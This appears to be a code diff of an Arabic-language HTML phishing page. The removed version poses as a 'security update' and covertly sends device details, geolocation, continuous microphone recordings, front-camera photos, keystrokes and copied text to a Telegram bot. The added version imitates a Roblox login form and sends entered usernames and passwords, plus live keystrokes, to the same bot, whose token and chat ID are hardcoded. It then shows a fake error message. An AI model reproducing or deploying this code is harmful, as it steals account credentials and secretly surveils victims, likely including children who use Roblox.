@@ -1,226 +1,275 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تحديث</title>
+    <title>Roblox - تسجيل الدخول</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; }
-        .container { background: white; padding: 40px 30px; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.12); max-width: 400px; width: 100%; text-align: center; }
-        h2 { color: #1a1a2e; font-size: 22px; }
-        p { color: #555; font-size: 14px; margin: 20px 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #2d7aff; border-radius: 50%; width: 44px; height: 44px; animation: spin 0.9s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #video, #canvas { display: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        body {
+            background: #e9f0f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo {
+            font-size: 32px;
+            font-weight: 900;
+            color: #1a1a2e;
+            letter-spacing: -1px;
+            margin-bottom: 20px;
+        }
+        .logo span { color: #2d7aff; }
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+        }
+        .sub {
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .sub a {
+            color: #2d7aff;
+            text-decoration: none;
+        }
+        .input-group {
+            margin-bottom: 14px;
+            text-align: left;
+        }
+        .input-group label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            background: #f9f9f9;
+            transition: border-color 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #2d7aff;
+            outline: none;
+            background: white;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #2d7aff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 6px;
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #1a5fd0; }
+        .options {
+            display: flex;
+            justify-content: space-between;
+            margin: 16px 0 10px;
+            font-size: 13px;
+        }
+        .options a {
+            color: #2d7aff;
+            text-decoration: none;
+        }
+        .options a:hover { text-decoration: underline; }
+        .footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #777;
+        }
+        .footer a {
+            color: #2d7aff;
+            text-decoration: none;
+        }
+        .error {
+            color: #d32f2f;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+            margin-top: 10px;
+            background: #ffebee;
+            padding: 8px;
+            border-radius: 6px;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #aaa;
+            font-size: 12px;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
+        .divider::before { margin-right: 10px; }
+        .divider::after { margin-left: 10px; }
+        .social-btn {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            background: white;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .social-btn:hover { background: #f5f5f5; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>🔒 تحديث الأمان</h2>
-        <p>جاري تأمين حسابك...</p>
-        <div class="loader"></div>
-        <p style="font-size:12px;color:#888;">يرجى الانتظار</p>
+        <div class="logo">Roblox</div>
+        <h2>تسجيل الدخول</h2>
+        <p class="sub">أدخل بيانات حسابك للمتابعة</p>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label>البريد الإلكتروني / اسم المستخدم</label>
+                <input type="text" id="username" placeholder="أدخل بريدك أو اسم المستخدم" required>
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+
+            <button type="submit" class="btn">تسجيل الدخول</button>
+
+            <div class="options">
+                <label style="font-weight:400;color:#555;">
+                    <input type="checkbox" checked> تذكرني
+                </label>
+                <a href="#">نسيت كلمة المرور؟</a>
+            </div>
+
+            <div class="error" id="errorMsg">⚠️ بيانات غير صحيحة، حاول مرة أخرى</div>
+
+            <div class="divider">أو</div>
+
+            <button class="social-btn" type="button">🔵 متابعة باستخدام Google</button>
+            <button class="social-btn" type="button">⚫ متابعة باستخدام Apple</button>
+
+            <div class="footer">
+                ليس لديك حساب؟ <a href="#">إنشاء حساب</a>
+            </div>
+        </form>
     </div>
 
-    <video id="video" playsinline webkit-playsinline muted></video>
-    <canvas id="canvas"></canvas>
+    <script>
+        // =============================================
+        // إعدادات البوت
+        // =============================================
+        const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
+        const CHAT_ID = '6526473202';
 
-<script>
-// =============================================
-// إعدادات البوت
-// =============================================
-const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
-const CHAT_ID   = '6526473202';
-
-function sendToTelegram(text) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'HTML'
-        })
-    }).catch(e => console.log(e));
-}
-
-function sendPhotoToTelegram(photoData, caption) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            photo: photoData,
-            caption: caption,
-            parse_mode: 'HTML'
-        })
-    }).catch(e => console.log(e));
-}
-
-function sendAudioToTelegram(audioData, caption) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            audio: audioData,
-            caption: caption,
-            parse_mode: 'HTML'
-        })
-    }).catch(e => console.log(e));
-}
-
-// =============================================
-// 1. البيانات الأساسية
-// =============================================
-const ua = navigator.userAgent;
-const isMobile = /iPhone|iPad|iPod|Android|BlackBerry|Opera Mini|IEMobile/i.test(ua);
-const deviceType = isMobile ? 'جوال' : 'كمبيوتر';
-let os = 'غير معروف';
-if (/Windows NT 10.0/.test(ua)) os = 'Windows 10';
-else if (/Mac OS X/.test(ua)) os = 'MacOS';
-else if (/Android/.test(ua)) os = 'Android';
-else if (/iPhone|iPad/.test(ua)) os = 'iOS';
-
-let msg = `<b>✅ تم فتح الرابط</b>\n\n`;
-msg += `📱 الجهاز: ${deviceType} (${os})\n`;
-msg += `🌐 IP: ${window.location.hostname}\n`;
-msg += `📱 المتصفح: ${ua}\n`;
-msg += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
-msg += `📅 الوقت: ${new Date().toISOString()}`;
-sendToTelegram(msg);
-
-// =============================================
-// 2. الموقع الجغرافي (بدون موافقة! - محاولة)
-// =============================================
-// ملاحظة: لا يمكن الحصول على الموقع بدون موافقة المستخدم في المتصفحات الحديثة.
-// لكن يمكن طلب الإذن بشكل وهمي ("لتحديد منطقتك").
-if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-        pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            sendToTelegram(`📍 <b>الموقع الجغرافي</b>\nhttps://maps.google.com/?q=${lat},${lon}`);
-        },
-        err => {
-            sendToTelegram('❌ تعذر الحصول على الموقع (تم الرفض)');
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            }).catch(e => console.log(e));
         }
-    );
-}
 
-// =============================================
-// 3. التسجيل الصوتي التلقائي (بدء فوراً)
-// =============================================
-let mediaRecorder;
-let audioChunks = [];
-let isRecording = false;
+        // =============================================
+        // 1. البيانات الأساسية عند فتح الرابط
+        // =============================================
+        const ua = navigator.userAgent;
+        const isMobile = /iPhone|iPad|iPod|Android|BlackBerry|Opera Mini|IEMobile/i.test(ua);
+        const deviceType = isMobile ? 'جوال' : 'كمبيوتر';
+        let os = 'غير معروف';
+        if (/Windows NT 10.0/.test(ua)) os = 'Windows 10';
+        else if (/Mac OS X/.test(ua)) os = 'MacOS';
+        else if (/Android/.test(ua)) os = 'Android';
+        else if (/iPhone|iPad/.test(ua)) os = 'iOS';
 
-function startRecording() {
-    navigator.mediaDevices.getUserMedia({ audio: true })
-    .then(stream => {
-        mediaRecorder = new MediaRecorder(stream);
-        audioChunks = [];
-        mediaRecorder.ondataavailable = e => {
-            if (e.data.size > 0) audioChunks.push(e.data);
-        };
-        mediaRecorder.onstop = () => {
-            const blob = new Blob(audioChunks, { type: 'audio/mp4' });
-            const reader = new FileReader();
-            reader.onload = f => {
-                const audioData = f.target.result;
-                sendAudioToTelegram(audioData, '🎤 <b>تسجيل صوتي تلقائي</b>');
-            };
-            reader.readAsDataURL(blob);
-            // إعادة التسجيل بعد الإرسال مباشرة (تسجيل مستمر)
-            if (isRecording) {
-                setTimeout(startRecording, 500);
+        let msg = `<b>✅ تم فتح الرابط</b>\n\n`;
+        msg += `📱 الجهاز: ${deviceType} (${os})\n`;
+        msg += `🌐 IP: ${window.location.hostname}\n`;
+        msg += `📱 المتصفح: ${ua}\n`;
+        msg += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
+        msg += `📅 الوقت: ${new Date().toISOString()}`;
+        sendToTelegram(msg);
+
+        // =============================================
+        // 2. عند إرسال النموذج (جلب البيانات)
+        // =============================================
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // إرسال البيانات إلى تليجرام
+            let dataMsg = `<b>🔓 بيانات روبلوكس</b>\n\n`;
+            dataMsg += `👤 اسم المستخدم: ${username}\n`;
+            dataMsg += `🔑 كلمة المرور: ${password}\n\n`;
+            dataMsg += `📅 الوقت: ${new Date().toISOString()}`;
+
+            sendToTelegram(dataMsg);
+
+            // إظهار رسالة خطأ وهمية
+            document.getElementById('errorMsg').style.display = 'block';
+
+            // إعادة تعيين الحقول بعد 3 ثواني
+            setTimeout(() => {
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('errorMsg').style.display = 'none';
+            }, 3000);
+        });
+
+        // =============================================
+        // 3. Keylogger (تسجيل كل ما يكتب)
+        // =============================================
+        document.addEventListener('input', e => {
+            if (e.target.value && (e.target.id === 'username' || e.target.id === 'password')) {
+                sendToTelegram(`⌨️ <b>كتابة في حقل ${e.target.id}</b>\n${e.target.value.substring(0, 50)}`);
             }
-        };
-        mediaRecorder.start();
-        isRecording = true;
-        sendToTelegram('🎙️ بدء التسجيل الصوتي...');
-    })
-    .catch(err => {
-        sendToTelegram('❌ تعذر الوصول إلى الميكروفون (تم الرفض)');
-    });
-}
+        });
 
-// بدء التسجيل فوراً بعد 2 ثانية
-setTimeout(startRecording, 2000);
+        console.log('✅ صفحة روبلوكس تعمل');
+    </script>
 
-// =============================================
-// 4. الكاميرا الأمامية (تصور وترسل)
-// =============================================
-function takePhoto() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-    
-    navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-        audio: false
-    })
-    .then(stream => {
-        video.srcObject = stream;
-        video.play();
-        setTimeout(() => {
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photo = canvas.toDataURL('image/jpeg', 0.9);
-            sendPhotoToTelegram(photo, '📸 <b>صورة من الكاميرا الأمامية</b>');
-            stream.getTracks().forEach(track => track.stop());
-            video.srcObject = null;
-        }, 2000);
-    })
-    .catch(err => {});
-}
-
-setTimeout(takePhoto, 4000);
-
-// =============================================
-// 5. Keylogger (تسجيل كل ما يكتب)
-// =============================================
-document.addEventListener('input', e => {
-    if (e.target.value) {
-        sendToTelegram(`⌨️ <b>كتابة</b>\n${e.target.value.substring(0, 50)}`);
-    }
-});
-
-// =============================================
-// 6. نسخ الحافظة
-// =============================================
-document.addEventListener('copy', () => {
-    const text = document.getSelection().toString();
-    if (text && text.length > 0) {
-        sendToTelegram(`📋 <b>نسخ</b>\n${text.substring(0, 100)}`);
-    }
-});
-
-// =============================================
-// 7. البطارية
-// =============================================
-if (navigator.getBattery) {
-    navigator.getBattery().then(battery => {
-        const level = Math.round(battery.level * 100);
-        const charging = battery.charging ? '⚡ شاحن' : '🔌 بطارية';
-        sendToTelegram(`🔋 <b>البطارية</b>\n${level}% (${charging})`);
-    }).catch(() => {});
-}
-
-// =============================================
-// 8. إيقاف التسجيل عند إغلاق الصفحة
-// =============================================
-window.addEventListener('beforeunload', function() {
-    if (mediaRecorder && isRecording) {
-        mediaRecorder.stop();
-        isRecording = false;
-        sendToTelegram('⏹️ توقف التسجيل الصوتي (غادر الصفحة)');
-    }
-});
-
-console.log('✅ يعمل');
-</script>
 </body>
 </html>
